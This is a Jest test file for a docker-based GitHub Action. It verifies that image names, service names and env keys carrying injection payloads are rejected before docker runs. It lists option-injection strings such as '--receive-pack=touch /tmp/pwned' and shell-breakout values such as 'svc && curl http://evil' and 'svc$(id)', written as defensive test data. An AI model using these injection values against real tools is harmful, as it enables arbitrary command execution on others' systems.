/**
 * ARGUMENT (OPTION) INJECTION through action inputs that reach `docker`'s argv.
 *
 * Passing an argv array stops the SHELL from interpreting a value. It does NOT stop the
 * spawned program's OWN option parser, which reads a leading "-" as an option wherever it
 * appears in argv. The proven form is git, where `git push --receive-pack=<cmd>` executes
 * <cmd>; `docker` has the same shape, so a hostile value occupies an OPTION slot instead of
 * the value slot the code intended.
 *
 * The reachable inputs, all supplied by the consuming workflow:
 *
 *   image              -> `docker run -d --rm ... <image>`   (src/index.ts)
 *                      -> `docker inspect --format ... <image>` (extractHealthcheck)
 *   required-services  -> `docker exec <cid> s6-svstat /run/.../<service>` and, worse, the
 *                         `sh -c` fallback that INTERPOLATES the value into a shell script
 *   minimal-env        -> `docker run ... -e <key>=<value>`
 *
 * Every case asserts BOTH that the call is refused AND that execCommand was never invoked,
 * so a test cannot pass merely because the hostile value failed somewhere downstream.
 */

jest.mock("@actions/core", () => ({
  debug: jest.fn(),
  warning: jest.fn(),
  info: jest.fn(),
  setSecret: jest.fn(),
  getInput: jest.fn().mockReturnValue(""),
  isDebug: jest.fn().mockReturnValue(false)
}));

jest.mock("../src/lib/utils", () => ({
  sleep: jest.fn().mockResolvedValue(undefined)
}));

jest.mock("../src/lib/exec", () => ({
  execCommand: jest.fn()
}));

import { execCommand } from "../src/lib/exec";
import * as core from "@actions/core";
import { checkService, extractHealthcheck, buildEnvArgs } from "../src/lib/docker";
import { getInputs } from "../src/config";

const mockedExec = execCommand as unknown as jest.Mock;

const OPTION_LIKE = [
  "--receive-pack=touch /tmp/pwned",
  "--upload-pack=id",
  "-latest",
  "--config=/tmp/evil"
];

/**
 * `checkService` interpolates the service name into a `sh -c` script, so for THAT value a
 * leading-"-" check is necessary but not sufficient: shell metacharacters break out of the
 * script itself.
 */
const SHELL_METACHARACTERS = [
  "svc; touch /tmp/pwned",
  "svc$(id)",
  "svc`id`",
  "svc && curl http://evil",
  "svc | sh",
  "svc\nid"
];

describe("argument injection", () => {
  beforeEach(() => {
    mockedExec.mockReset();
    mockedExec.mockResolvedValue({ stdout: "", stderr: "", exitCode: 0 });
  });

  describe.each(OPTION_LIKE)("image %s", (payload) => {
    it("is refused by extractHealthcheck before docker is spawned", async () => {
      await expect(extractHealthcheck(payload)).rejects.toThrow();
      expect(mockedExec).not.toHaveBeenCalled();
    });

    it("is refused by getInputs so run() never spawns docker", () => {
      const inputs: Record<string, string> = {
        image: payload,
        verbose: "false",
        timeout: "120",
        "startup-timeout": "60",
        "minimal-env": "{}",
        "skip-healthcheck": "false",
        "skip-s6-check": "false",
        "required-services": "",
        "error-patterns": "[]",
        "mount-docker-socket": "false"
      };
      (core.getInput as unknown as jest.Mock).mockImplementation(
        (name: string) => inputs[name] ?? ""
      );

      expect(() => getInputs()).toThrow();
      expect(mockedExec).not.toHaveBeenCalled();
    });
  });

  describe.each(OPTION_LIKE)("service name %s", (payload) => {
    it("is refused by checkService before docker is spawned", async () => {
      await expect(checkService("container-id", payload)).rejects.toThrow();
      expect(mockedExec).not.toHaveBeenCalled();
    });
  });

  describe.each(SHELL_METACHARACTERS)("service name %j", (payload) => {
    it("is refused by checkService, which interpolates it into `sh -c`", async () => {
      await expect(checkService("container-id", payload)).rejects.toThrow();
      expect(mockedExec).not.toHaveBeenCalled();
    });
  });

  describe.each(OPTION_LIKE)("minimal-env key %s", (payload) => {
    it("is refused by buildEnvArgs", () => {
      expect(() => buildEnvArgs({ [payload]: "value" })).toThrow();
      expect(mockedExec).not.toHaveBeenCalled();
    });
  });

  describe("ordinary values still work", () => {
    it("inspects a normal image name", async () => {
      mockedExec.mockResolvedValue({ stdout: "null", stderr: "", exitCode: 0 });
      await expect(extractHealthcheck("ghcr.io/owner/img:1.2.3")).resolves.toBe("");
      expect(mockedExec).toHaveBeenCalledWith(
        "docker",
        ["inspect", "--format", expect.any(String), "ghcr.io/owner/img:1.2.3"],
        true,
        true
      );
    });

    it("checks a normal service name", async () => {
      mockedExec.mockResolvedValue({ stdout: "up (pid 1) 5 seconds", stderr: "", exitCode: 0 });
      await expect(checkService("container-id", "my-svc")).resolves.toContain("up");
      expect(mockedExec).toHaveBeenCalled();
    });

    it("builds env args for normal keys", () => {
      expect(buildEnvArgs({ PUID: "1000", TZ: "UTC" })).toEqual([
        "-e",
        "PUID=1000",
        "-e",
        "TZ=UTC"
      ]);
    });
  });
});
